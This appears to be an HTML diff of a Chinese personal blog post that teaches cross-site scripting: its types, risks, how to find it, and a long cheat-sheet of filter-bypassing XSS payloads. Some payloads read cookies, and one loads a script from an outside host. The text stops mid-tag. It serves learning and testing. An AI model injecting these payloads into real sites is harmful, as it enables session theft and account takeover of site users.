@@ -1,0 +1,1123 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  <link rel="icon" href="/images/favicon.ico">
+  
+  <title>xss学习 | Err0r233</title>
+  <meta name="author" content="Err0r2333" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="基础漏洞" />
+  
+  <meta name="description" content="再不学xss就要被学弟狠狠超了:(">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss学习">
+<meta property="og:url" content="http://example.com/posts/20141.html">
+<meta property="og:site_name" content="Err0r233">
+<meta property="og:description" content="再不学xss就要被学弟狠狠超了:(">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/favicon.ico">
+<meta property="article:published_time" content="2024-04-18T02:54:57.000Z">
+<meta property="article:modified_time" content="2024-04-18T09:46:16.772Z">
+<meta property="article:author" content="Err0r2333">
+<meta property="article:tag" content="基础漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/favicon.ico">
+<meta name="twitter:site" content="@Err0r2333">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner3.png');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/qwq.jpg');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
+</head>
+
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                        
+                                            <li>
+                                                <a><i class="fa fa-link"></i>链接</a>
+                                                <ul class="sub-menu">
+                                                    
+                                                        
+                                                    
+                                                </ul>
+                                            </li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">Err0r233</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>Err0r233</h2> <br />
+                        <span>Err0r233的个人博客</span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/20141.html">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">xss学习</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2024-04-18T02:54:57.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-04-18</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">Err0r2333</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~21.86K
+                    
+                    字
+                </li>
+                
+                    <li id="/posts/20141.html" class="leancloud_visitors" data-flag-title="xss学习">
+                        <i class="fa fa-eye"></i>
+                        <span class="leancloud-visitors-count"> </span> 次阅读
+                    </li>
+                    
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1713433576772"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+            <hr />
+            <div itemprop="articleBody"><p>再不学xss就要被学弟狠狠超了:(</p>
+<span id="more"></span>
+<p>xss是<strong>代码注入的一种</strong>，它允许攻击者将恶意代码注入到前端页面上</p>
+<p>然后其他用户在浏览网页的时候就会受到影响</p>
+<p>本质就是攻击者在web端插入了恶意的script代码(可能是css、js脚本或者是其他)，当受害者访问这种页面的时候，就会执行其中的恶意代码，获取到用户的session、token、cookies等</p>
+<p>xss的危害：</p>
+<ol>
+<li>盗取身份信息，<strong>窃取会话Cookie</strong>从而窃取网站用户隐私、包括账户、浏览历史、IP等</li>
+<li>未授权操作，通过JS发起<strong>敏感操作</strong>请求</li>
+<li>按键记录和钓鱼</li>
+<li>更广泛的蠕虫传播，借助网站进行传播，使网站的使用用户受到攻击。</li>
+<li>劫持用户会话，从而知悉任意操作，比如弹窗跳转、篡改页面、网页挂马。</li>
+</ol>
+<p>这个敏感操作包括但不限于修改密码、创建工单等</p>
+<h1><span id="xss的分类"> XSS的分类</span></h1>
+<p>xss有三种分类：</p>
+<ul>
+<li>反射型xss</li>
+<li>存储型xss</li>
+<li>DOM型xss</li>
+</ul>
+<p>反射型和DOM型是非持久型xss攻击，而存储型是持久型xss攻击</p>
+<h1><span id="反射型xss"> 反射型xss</span></h1>
+<blockquote>
+<p>payload不会存储到数据库中，一般会出现在查询页面</p>
+<p>输入内容直接返回的参数都可能存在xss</p>
+</blockquote>
+<p>攻击对于受害者而言是一次性的</p>
+<p>攻击者会诱导受害者点击恶意url，点击之后由于url包含了恶意js脚本，这些脚本就会直接在受害者的主机上的浏览器执行</p>
+<p>恶意代码并没有保存在网站，而web端也只是将这个js脚本反射回受害者的浏览器并执行了相应的脚本</p>
+<p>流程：</p>
+<ul>
+<li>攻击者准备好恶意url(有payload)，发送给用户</li>
+<li>用户点击链接</li>
+<li>web服务将xss代码返回给用户</li>
+<li>客户端执行xss代码，将信息发送到了攻击者的服务中</li>
+<li>攻击者就可以读取用户的信息</li>
+</ul>
+<p>一图流：</p>
+<img src="/posts/undefined/1635735254568-5a8e1934-eff9-49ae-9749-34c14666f1d5.png" class title="awa">
+<h1><span id="存储型xss"> 存储型xss</span></h1>
+<blockquote>
+<p>将payload放在了数据库里，一般出现在会将数据存储到数据库并展示在前端页面的功能</p>
+<p>如<strong>注册页，留言板等功能</strong></p>
+</blockquote>
+<p>存储型xss先将payload存储在数据库中，然后当下一次数据库从中取出数据直接将其展示在前端的时候，页面将会执行xss攻击用户</p>
+<p>存储型xss的危害会更大，因为他将恶意代码上传或者存储到了服务器当中，只要是个访问了包含这段恶意代码的页面的用户就可能会被xss攻击</p>
+<p>攻击流程：</p>
+<ul>
+<li>攻击者向web服务插入xss payload</li>
+<li>然后web服务会将其存储到数据库</li>
+<li>用户访问web服务</li>
+<li>web服务会将数据库中的数据以及视图返回给前端，前端渲染并加载。其中包含有xss payload</li>
+<li>此时xss代码被加载，客户端执行xss代码并向攻击者服务器发送敏感信息</li>
+<li>攻击者读取受害者的敏感信息</li>
+</ul>
+<img src="/posts/undefined/2.png" class title="awa">
+<h1><span id="dom型xss"> DOM型xss</span></h1>
+<blockquote>
+<p>不与后端交互、payload不存到数据库中，属于反射型的一种</p>
+<p>但是他是通过dom操作来产生问题</p>
+<p>发掘较困难</p>
+</blockquote>
+<p>DOM叫<code>Document Object Model</code></p>
+<p>能够使程序和脚本动态访问和更新文档的内容、结构、样式</p>
+<p>客户端的脚本可以动态地检查和修改页面内容，无需依赖服务端。客户端从url中提取数据并在本地执行</p>
+<p>如果用户在客户端输入的数据包含了恶意js脚本，并且没有被过滤的话，就会导致DOM型xss</p>
+<p>和反射型xss不同的是，dom型无需向web服务发送请求，而是直接在浏览器执行。需要注意用户的输入源：<code>document.URL</code>、<code>location.hash</code>、<code>location.search</code>、<code>document.referrer</code>等</p>
+<p>攻击流程：</p>
+<ul>
+<li>攻击者发送恶意url</li>
+<li>用户点击恶意链接，打开浏览器</li>
+<li>直接在浏览器客户端执行xss</li>
+<li>此时将xss的结果发送给攻击者的恶意服务</li>
+<li>攻击者访问xss平台，获取敏感信息</li>
+</ul>
+<h1><span id="xss的区别"> xss的区别：</span></h1>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"></th>
+<th style="text-align:left">反射型</th>
+<th style="text-align:left">存储型</th>
+<th>DOM型</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">攻击对象</td>
+<td style="text-align:left">需要攻击者主动寻找受害者并诱导其访问</td>
+<td style="text-align:left">广撒网，只要有用户访问对应的页面就会触发，危害性更大，范围更广</td>
+<td>需要攻击者主动寻找受害者并诱导其访问（同反射型）</td>
+</tr>
+<tr>
+<td style="text-align:left">持久性</td>
+<td style="text-align:left">一次性</td>
+<td style="text-align:left">只要服务器不宕机，payload不被手动删除，就一直存在</td>
+<td>一次性</td>
+</tr>
+<tr>
+<td style="text-align:left">触发点</td>
+<td style="text-align:left">网站中直接返回参数内容的功能点</td>
+<td style="text-align:left">网站中将数据直接存储到数据库中，后直接返回数据在前端展示的功能点</td>
+<td>取决于DOM节点</td>
+</tr>
+</tbody>
+</table>
+<p>反射型xss中，返回的html包含了恶意payload</p>
+<p>而DOM型没有包含恶意payload</p>
+<h1><span id="xss与csrf"> xss与csrf</span></h1>
+<p>xss:</p>
+<ul>
+<li>主要加载js代码，在客户端执行</li>
+<li>不一定要经过后端，主要需要客户端执行xss代码</li>
+<li>DOM型xss只对浏览器客户端发起攻击</li>
+<li>xss是针对用户的攻击</li>
+</ul>
+<p>csrf:</p>
+<ul>
+<li>欺骗服务器，虽然由用户发起，但服务器无法判断是否是用户想要发起的请求</li>
+<li>一定会经过后端处理，否则无法执行</li>
+<li>csrf用于伪造身份，实行对服务器的欺骗</li>
+</ul>
+<h1><span id="挖掘xss"> 挖掘xss</span></h1>
+<p>一般可以通过输入一些常见的标签，例如<code>h1</code>，<code>img</code>等进行确认</p>
+<ul>
+<li>直接返回输入内容的可能存在反射型xss</li>
+<li>在页面中进行特定渲染的可能存在DOM型</li>
+<li>存储到数据库的可能存在存储型xss</li>
+</ul>
+<p>有时候可以将返回页面的关键词进行一些拼接：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> imgErrorLen=<span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ie&quot;</span> <span class="attr">value</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>例如上面这个就可以构造<code>mgErrorLen=&lt;h1&gt;123&lt;/h1&gt;&amp;ie=&lt;h1&gt;123&lt;/h1&gt;</code></p>
+<p>可以构造一个xss的fuzz字典（</p>
+<p>白盒的时候</p>
+<ul>
+<li>看一下接受信息的方式<code>$_GET</code>、<code>$_POST</code>、<code>$_REQUEST</code>等，检查这些方式接受的信息有没有输出到页面中，输出到页面中的数据是否进行了过滤和html编码处理</li>
+<li>搜索类似<code>echo</code>等输出语句，然后追踪输出变量的来源等。根据来源检查是否可控。存到数据库的时候有没有过滤等</li>
+<li>大多数程序会对接收到的参数封装在公共文件的函数中统一调用</li>
+<li>搜索一些js操作dom元素的关键词进行审计</li>
+</ul>
+<p>(dom型其实就是利用js脚本的xss，比如某个function里面一个拼接操作，你只需要闭合一下前面的再添加自己的xss)</p>
+<h1><span id="常见xss业务场景"> 常见xss业务场景</span></h1>
+<ul>
+<li>评论区、留言区、个人订单、信息反馈等 这些是重灾区</li>
+<li>站内私信、意见反馈等 这些是针对型</li>
+<li>搜索框、头像链接、图片属性、目录这些可能回存在问题</li>
+</ul>
+<h1><span id="常见payload"> 常见payload</span></h1>
+<p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Cross-Site Scripting (XSS) Cheat Sheet - 2024 Edition | Web Security Academy (portswigger.net)</a></p>
+<p>一个速查表</p>
+<p>fuzz字符：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;;!--&quot;<span class="tag">&lt;<span class="name">h1</span>&gt;</span>=&amp;&#123;()&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2><span id="基础payload"> 基础payload</span></h2>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">Details</span> <span class="attr">Open</span> <span class="attr">OnToggle</span> =<span class="string">co\u006efirm</span>`<span class="attr">XSS</span>`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">SRC</span>=<span class="string">http://damit5.kiwi/xss.js</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SVG</span> <span class="attr">ONLOAD</span>=<span class="string">&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>nmask<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:confirm(&#x27;xxx&#x27;)&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;nofollow&quot;</span>&gt;</span>你可以点击我触发<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onhashchange</span>=<span class="string">a</span>=<span class="string">alert,a(document.domain)</span>&gt;</span>  <span class="comment">&lt;!-- # http://xxx.xxx.xxx#123 http://xxx.xxx.xxx#124 触发 --&gt;</span></span><br><span class="line">&lt;body/onpageshow=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line">&lt;details/open/ontoggle=top[&quot;al&quot;+&quot;ert&quot;](1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">discard</span> <span class="attr">onbegin</span>=<span class="string">[1].find(alert)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>/*<span class="attr">sv</span>=<span class="string">x</span> */<span class="attr">onerror</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span> <span class="attr">onerror</span>=<span class="string">alt</span>=<span class="string">&#x27;&#x27;</span>+<span class="attr">document.domain</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;X&quot;</span> <span class="attr">onerror</span>=<span class="string">(a</span>=<span class="string">alert,b</span>=<span class="string">document[</span>&#x27;\<span class="attr">x63</span>\<span class="attr">x6f</span>\<span class="attr">x6f</span>\<span class="attr">x6b</span>\<span class="attr">x69</span>\<span class="attr">x65</span>&#x27;],<span class="attr">a</span>(<span class="attr">b</span>))&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;X&quot;</span> <span class="attr">onerror</span>=<span class="string">top[8680439..toString(30)](1337)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x:alert&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;eval(src+&#x27;(0)&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">a</span>=<span class="string">alert,a(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">0</span> <span class="attr">onerror</span>=<span class="string">confirm(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">setInterval</span>`<span class="attr">alert</span>\<span class="attr">x28document.domain</span>\<span class="attr">x29</span>`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">setTimeout</span>`<span class="attr">alert</span>\<span class="attr">x28document.cookie</span>\<span class="attr">x29</span>`&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x:alert(alt)</span> <span class="attr">onerror</span>=<span class="string">eval(src)</span> <span class="attr">alt</span>=<span class="string">0</span>&gt;</span></span><br><span class="line">&lt;img/src/onerror=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;&quot;</span> <span class="attr">name</span>=<span class="string">&quot;roots&quot;</span> <span class="attr">id</span>=<span class="string">&quot;roots&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">1</span> <span class="attr">onfocus</span>=<span class="string">alert(11)</span> <span class="attr">autofocus</span>=&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;returnurl&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> <span class="attr">accesskey</span>=<span class="string">&quot;X&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(document.domain)&quot;</span> /&gt;</span> <span class="comment">&lt;!--针对 hidden 的 input 标签，firefox下 shift+alt+X 成功--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">autofocus</span>/<span class="attr">onfocus</span>=<span class="string">&#x27;prompt(1);&#x27;</span>/&gt;</span>//</span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert()&quot;</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadeddata</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadedmetadata</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onloadstart</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">x</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">oncanplay</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplay</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">autoplay</span> <span class="attr">controls</span> <span class="attr">onplaying</span>=<span class="string">&quot;alert()&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">&quot;http://mirrors.standaloneinstaller.com/video-sample/lion-sample.mp4&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">loop</span>=<span class="string">1</span> <span class="attr">onFinish</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span>123<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span>   <span class="comment">&lt;!-- # 滚动标签 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">noscript</span>&gt;</span><span class="tag">&lt;<span class="name">p</span> <span class="attr">title</span>=<span class="string">&quot;&lt;/noscript&gt;&lt;img src=x onerror=alert(1)&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>a=prompt;a(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">: <span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;embed/embed/embed/src=https://14.rs&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>);;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!--用分号，也可以分号+空格（回车一起使用）--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">a</span>==<span class="number">1</span>?<span class="number">1</span>:<span class="title function_">prompt</span>(a=<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;svg/onload=&quot;[][&#x27;\146\151\154\164\145\162&#x27;][&#x27;\143\157\156\163\164\162\165\143\164\157\162&#x27;](&#x27;\141\154\145\162\164\50\61\51&#x27;)()&quot;&gt;</span><br><span class="line">&lt;svg/onload=[document.cookie].find(alert)&gt;</span><br><span class="line">&lt;svg/onload=alert<span class="symbol">&amp;lpar;</span>1<span class="symbol">&amp;rpar;</span>&gt;</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line">&lt;svg/onload=top[&#x27;al\145rt&#x27;](1)&gt;</span><br><span class="line">&lt;svg/onload=top[/al/.source+/ert/.source](1)&gt;</span><br><span class="line">&lt;x/oncut=alert(1)&gt;a</span><br><span class="line">&lt;iframe/src=&quot;data:text<span class="symbol">&amp;sol;</span>html;<span class="symbol">&amp;Tab;</span>base64&quot;&gt;<span class="symbol">&amp;NewLine;</span>,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">id</span>=<span class="string">&quot;rectangle&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span><span class="attr">xmlns:xlink</span>=<span class="string">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">&quot;javascript:alert(location)&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">rect</span> <span class="attr">x</span>=<span class="string">&quot;0&quot;</span> <span class="attr">y</span>=<span class="string">&quot;0&quot;</span> <span class="attr">width</span>=<span class="string">&quot;100&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span 